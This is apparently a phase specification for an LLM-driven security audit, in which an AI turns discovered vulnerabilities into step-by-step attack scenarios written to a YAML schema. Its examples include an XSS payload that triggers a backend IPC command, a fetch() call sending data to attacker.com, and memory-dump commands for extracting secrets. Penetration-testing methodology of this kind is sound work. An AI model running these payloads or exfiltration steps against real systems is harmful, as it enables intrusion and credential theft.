# Phase 4: Attack Construction

**Type** : Creative offensive
**Executor** : LLM + Offensive reasoning
**Input** : P3_vulnerabilities.yaml
**DATA** : attacks/ + exploits/ loaded in P0 (stack-specific exploitation techniques)

---

## EXHAUSTIVENESS DIRECTIVE - MANDATORY

> The offensive DATA loaded in P0 (attacks/ + exploits/) remain available for P4.
> Every VULN-xxx from P3 MUST be handled here: either mapped to an ATK-xxx,
> or marked `not_exploitable` with precise justification.
> Zero vulnerabilities may disappear between P3 and P4.
>
> **CONSERVATION RULE**: P3.summary.total == P4.vuln_coverage.mapped_to_scenario + P4.vuln_coverage.not_exploitable
>
> Scenarios must use REAL tools and commands adapted to the stack detected in P0.
> The offensive DATA (attacks/ + exploits/) provide the stack-specific exploitation
> techniques: consult them for each active category before building scenarios.

---

## MANDATORY: 4-Gate Protocol (BLOCKING)

---

### REFLECTION - P4 Entry Gate

**Objective** : For each vulnerability identified in P3, build a concrete and realistic attack scenario adapted to the detected stack. Move from "this vulnerability exists" to "here is exactly how a hacker exploits it, step by step, with real commands."

```
REFLECTION - P4 Entry Gate
================================================

CENTRAL PROBLEM
Transform each abstract vulnerability into a concrete
attack scenario, with attacker profile, preconditions,
detailed steps, real commands for the detected stack,
and measurable impact.

UPSTREAM DATA (P3)
| Metric | Value |
|--------|-------|
| Total vulnerabilities | {P3.summary.total} |
| Critical | {P3.summary.by_severity.CRITICAL} |
| High | {P3.summary.by_severity.HIGH} |
| Medium | {P3.summary.by_severity.MEDIUM} |
| Active categories | {P0.attack_categories_active[].code} |

GUIDING PRINCIPLE
"A hacker does not just find a vulnerability.
They build a complete exploitation path,
from initial access to the final objective."

AVAILABLE OFFENSIVE DATA
Files loaded in P0 contain stack-specific exploitation techniques.
Consult each relevant file before building scenarios
for the corresponding category:
- attacks/generic/: universal techniques (injection, XSS, supply chain)
- attacks/{stack}/: techniques specific to the detected framework
- exploits/: PoCs and advanced exploitation chains

================================================
STOP CHECK
- P3_vulnerabilities.yaml read and valid? [YES/NO]
- Offensive DATA still in context? [YES/NO]
- Active categories identified from P0? [YES/NO]
- Ready to continue? [YES/NO]
================================================
```

---

### PLANNING - Breakdown

```
PLANNING - P4 Sub-tasks
================================================

| # | Sub-task | Expected output |
|---|----------|-----------------|
| T1 | Sort vulnerabilities by exploitability | Ordered list |
| T2 | Build CRITICAL scenarios | ATK-xxx with complete steps |
| T3 | Build HIGH scenarios | ATK-xxx with complete steps |
| T4 | Build MEDIUM/LOW scenarios | ATK-xxx with steps |
| T5 | Document non-exploitables | Justification for each |
| T6 | Verify vulnerability coverage | All VULN accounted for |
| T7 | Write final output | P4_attack_scenarios.yaml + report |

================================================
```

---

### EXECUTION

#### T1: Sort by Exploitability

For each VULN from P3, evaluate:
- **Required access** : Remote from internet? Same machine? Physical access?
- **Complexity** : Low (script kiddie with public tools)? Medium (skilled hacker)? High (stack-specific expertise)?
- **User interaction** : None? Required (user must open a link, accept a dialog)?
- **Impact** : What does the attacker gain? (RCE, secret theft, privilege escalation, DB exfiltration)

Scenario construction order:
1. CRITICAL first (RCE, privilege escalation, all-secret theft)
2. HIGH next (token theft, injection, unauthorized access)
3. MEDIUM (information leakage, security degradation)
4. LOW -> often "not exploitable alone" but useful in chains (P5)

#### T2-T4: Scenario Construction

For each exploitable VULN, build an ATK-xxx scenario.

**Consult offensive DATA**: Before building scenarios for a category,
re-read the corresponding attacks/ file to use the documented exploitation
techniques and adapt them to the project context.

**ATK-xxx format**:

```yaml
- id: ATK-{seq}
  vuln_refs: ["VULN-xxx"]
  category: "{CATEGORY}"  # dynamic from P0.attack_categories_active
  title: "Descriptive attack title"

  attacker_profile: "Description of the required attacker profile"
  attacker_skill_level: "script_kiddie|competent|expert|nation_state"
  attacker_position: "remote|same_network|local|physical"

  preconditions:
    - "Required condition 1"
    - "Required condition 2"

  attack_steps:
    - step: 1
      action: "Action description"
      command: "concrete_command_or_payload adapted to the stack"
      tool: "tool name"
      result: "What the attacker obtains"
      detection_risk: "low|medium|high"

  impact: "Concrete description of what the attacker gains"
  severity: CRITICAL|HIGH|MEDIUM|LOW
  cvss: 0.0-10.0

  evidence:
    file: "path/to/file.ext"
    line: 42
    code: "the vulnerable code"
    issue: "why it is exploitable"

  estimated_time: "5 minutes|1 hour|1 day"
  tools_required: ["tool1", "tool2"]

  detection_difficulty: "easy|moderate|difficult|invisible"
  indicators_of_compromise:
    - "What would betray the attacker"
```

#### Scenario Examples (Illustration, not instruction)

> **NOTE** : The examples below illustrate the expected FORMAT.
> Actual commands depend on the stack detected in P0.
> Offensive DATA (attacks/ + exploits/) provide the exploitation
> techniques to use.

---

**CRITICAL ATK EXAMPLE - IPC Escalation to RCE**

```yaml
# Illustrative example — adapt to the detected stack
- id: ATK-001
  vuln_refs: ["VULN-XSS-001", "VULN-IPC-002"]
  category: IPC   # active category detected in P0
  title: "XSS in external content -> backend IPC call -> OS command execution"

  attacker_profile: "Operator of a content site consumed by the application"
  attacker_skill_level: "competent"
  attacker_position: "remote"

  preconditions:
    - "The application renders external content without sanitization"
    - "An IPC command allows privileged actions"
    - "IPC arguments are not validated on the backend side"

  attack_steps:
    - step: 1
      action: "Inject a payload into the consumed external content"
      command: |
        # Payload adapted to the detected frontend framework
        # Ex: XSS via unescaped content rendered in the view
        <script>frameworkIPC.call('execute', {cmd: 'id'})</script>
      tool: "Malicious content server"
      result: "Payload injected into the application frontend"
      detection_risk: "low"

    - step: 2
      action: "The frontend executes the payload and calls the backend via IPC"
      command: "# The payload triggers an unauthorized IPC call"
      tool: "Framework IPC mechanism"
      result: "Command executed with backend privileges"
      detection_risk: "low"

    - step: 3
      action: "Exfiltrate the result to the attacker's server"
      command: "fetch('https://attacker.com/collect?d=' + btoa(result))"
      tool: "HTTP from the frontend"
      result: "Sensitive data exfiltrated"
      detection_risk: "low"

  impact: "RCE with backend process privileges, secret exfiltration"
  severity: CRITICAL
  cvss: 9.8
  estimated_time: "30 minutes of preparation, then passive attack"
  tools_required: ["Malicious content server", "Exfiltration server"]
  detection_difficulty: "difficult"
  indicators_of_compromise:
    - "HTTPS requests to an unknown domain from the process"
    - "IPC calls with unusual arguments in logs"

  evidence:
    file: "src/handlers/command_handler.ext"
    line: 47
    code: "fn execute(args) { run_command(args.cmd) }"
    issue: "Arguments passed directly to execution without validation"
```

---

**HIGH ATK EXAMPLE - Memory Secret Extraction**

```yaml
# Illustrative example — adapt based on detected OS and language
- id: ATK-004
  vuln_refs: ["VULN-CRYPTO-003"]
  category: CRYPTO
  title: "Process memory dump to extract non-zeroized secrets"

  attacker_profile: "Attacker with local machine access (same user)"
  attacker_skill_level: "competent"
  attacker_position: "local"

  preconditions:
    - "The attacker has machine access under the same account"
    - "Secrets are not zeroized after use"
    - "The application is running"

  attack_steps:
    - step: 1
      action: "Identify the target process PID"
      command: |
        # Linux: pgrep -f 'binary_name'
        # macOS: pgrep -f 'binary_name'
        # Windows: tasklist | findstr binary_name
      tool: "pgrep, ps, tasklist"
      result: "Target process PID"
      detection_risk: "low"

    - step: 2
      action: "Dump the process memory"
      command: |
        # Linux: /proc/{pid}/mem or gcore
        # macOS: vmmap + lldb attach
        # Windows: procdump -ma {pid}
      tool: "Memory dump tools per OS"
      result: "Binary file containing the process heap"
      detection_risk: "low"

    - step: 3
      action: "Search for secret patterns in the dump"
      command: |
        # Adapt patterns based on project secret types
        strings heap_dump.bin | grep -E 'secret_pattern'
      tool: "strings, grep"
      result: "Secrets extracted from memory"
      detection_risk: "low"

  impact: "Theft of all active secrets (API keys, tokens, credentials)"
  severity: HIGH
  cvss: 7.5
  estimated_time: "15 minutes"
  tools_required: ["Local system access", "strings, memory dump tools"]
  detection_difficulty: "difficult"
  indicators_of_compromise:
    - "Unusual access to process memory files"
    - "Secret usage from a different IP/context"

  evidence:
    file: "src/config/secrets.ext"
    line: 23
    code: "let api_key = String::from(env_var);"
    issue: "Secret stored in standard String, never zeroized"
```

---

#### Reference Attacker Profiles

> Adapt profiles based on the stack and attack surface detected in P0-P1.

| Profile | Access | Skills | Typical tools | Typical scenarios |
|---------|--------|--------|---------------|-------------------|
| Script Kiddie | Internet/Remote | Low | Public payloads, curl, scripts | Known CVEs, basic XSS |
| Malicious local user | Same machine | Medium | strings, debuggers, proxy | Memory dump, token theft |
| External content hacker | Remote | High | Malicious server, LLM payloads | Content injection, XPIA |
| Supply chain maintainer | Indirect (package registries) | Expert | npm/cargo/pip publish | Backdoors in dependencies |
| Insider developer | Code access | Variable | Internal code knowledge | Backdoors, secret extraction |
| Nation-state | Unlimited | Expert | 0-day, supply chain, toolkits | Sophisticated multi-vector attacks |

#### T5: Document Non-Exploitables

For each VULN from P3 that is NOT exploitable in the project context:

```yaml
not_exploitable:
  - vuln_ref: VULN-xxx
    reason: "Precise explanation of why this vulnerability is not exploitable"
    conditions_for_exploitation: "What would need to change for it to become exploitable"
```

> **IMPORTANT**: A vulnerability marked "not exploitable" ALONE can become
> exploitable in a CHAIN (P5). Document the conditions that would allow
> exploitation in a chaining context.

#### T6: Coverage Verification

**COUNT CONSERVATION RULE** (CRITICAL):

```
P3.summary.total == P4.vuln_coverage.mapped_to_scenario + P4.vuln_coverage.not_exploitable
```

Every VULN from P3 MUST be either:
- Mapped to one or more ATK-xxx
- Marked as `not_exploitable` with justification

**No vulnerability may disappear between P3 and P4.**

```yaml
vuln_coverage:
  total_vulns: {P3.summary.total}
  mapped_to_scenario: {n}
  not_exploitable: {n}
  # INVARIANT: mapped + not_exploitable == total_vulns
```

#### T7: Write Output

**Writing order** (CRITICAL):
1. **YAML** : `.attacker_working/{SESSION_ID}/data/P4_attack_scenarios.yaml`
2. **MD** : `.attacker_working/{SESSION_ID}/reports/P4-CONSTRUCTION-ATTAQUES.md`

**Full YAML contract** (see WORKFLOW.md S3 - P4):

```yaml
schema_version: "1.1.0"
phase: 4
generated_at: "ISO8601"
input_ref: "P3_vulnerabilities.yaml"

scenarios:
  - id: ATK-001
    vuln_refs: ["VULN-xxx"]
    category: "{CATEGORY}"
    title: "Scenario title"
    attacker_profile: "Attacker description"
    attacker_skill_level: "script_kiddie|competent|expert|nation_state"
    attacker_position: "remote|same_network|local|physical"
    preconditions:
      - "Prerequisite"
    attack_steps:
      - step: 1
        action: "Description"
        command: "Concrete command"
        tool: "Tool used"
        result: "Expected result"
        detection_risk: "low|medium|high"
    impact: "System impact"
    severity: "CRITICAL|HIGH|MEDIUM|LOW"
    cvss: 9.8
    evidence:
      file: "path/file.ext"
      line: 47
      code: "vulnerable code"
      issue: "explanation"
    estimated_time: "duration"
    tools_required: ["tool1"]
    detection_difficulty: "easy|moderate|difficult|invisible"
    indicators_of_compromise:
      - "indicator"

vuln_coverage:
  total_vulns: 0       # == P3.summary.total
  mapped_to_scenario: 0
  not_exploitable: 0
  not_exploitable_reasons:
    - vuln_ref: "VULN-xxx"
      reason: "Explanation"
      conditions_for_exploitation: "What would need to change"
```

---

### VALIDATION - Completeness Check

```
VALIDATION - P4 Check
================================================

| Checked element | Status |
|-----------------|--------|
| Each VULN from P3 accounted for (scenario or not_exploitable)? | [OK/FAIL] |
| Count conservation: total == mapped + not_exploitable? | [OK/FAIL] |
| Each ATK has an attacker profile? | [OK/FAIL] |
| Each ATK has steps with concrete commands for the stack? | [OK/FAIL] |
| Each ATK has evidence in the code (file:line)? | [OK/FAIL] |
| Each ATK has a severity and CVSS? | [OK/FAIL] |
| Commands use real tools? | [OK/FAIL] |
| Offensive DATA consulted for each category? | [OK/FAIL] |
| Each not_exploitable has justification + conditions? | [OK/FAIL] |
| P4_attack_scenarios.yaml written and conforming to contract? | [OK/FAIL] |
| P4-CONSTRUCTION-ATTAQUES.md report written? | [OK/FAIL] |

COMPLETION GATE
- All checks passed? [YES/NO]
- Ready to enter P5? [YES/NO]
================================================
```

---

## P4 Report Template

```markdown
# P4 - Attack Construction

## Summary
[X attack scenarios built from Y vulnerabilities]
[Z vulnerabilities judged non-exploitable]
[Active categories: {list of categories from P0}]

## Critical Scenarios

### ATK-001: [Title]
**Category**: [from P0.attack_categories_active]
**Attacker profile**: [Who]
**Preconditions**: [What]
**Steps**:
1. [Action + command adapted to stack + result]
2. [Action + command + result]
**Impact**: [What the attacker gains]
**Evidence**: [file.ext:line - vulnerable code]
**Estimated time**: [duration]
**Tools**: [real tools]

[Repeat for each critical scenario]

## High Scenarios
[Same format]

## Medium Scenarios
[Summary format]

## Non-Exploitable Vulnerabilities
[Table with justification and exploitation conditions for each]

## Coverage
[Verification that all VULN are accounted for]
| P3 Total | Mapped to ATK | Not exploitable | Verification |
|----------|---------------|-----------------|-------------|
| {n} | {n} | {n} | {n}+{n}=={n} |

## Attacker Observations
[Which scenarios offer the best return (effort vs impact)?]
[Which scenarios can be automated?]
[What would be the first vector used by a real attacker?]
[What exploitation chains seem possible? (preview for P5)]
```

---

**End of P4-CONSTRUCTION-ATTAQUES.md**
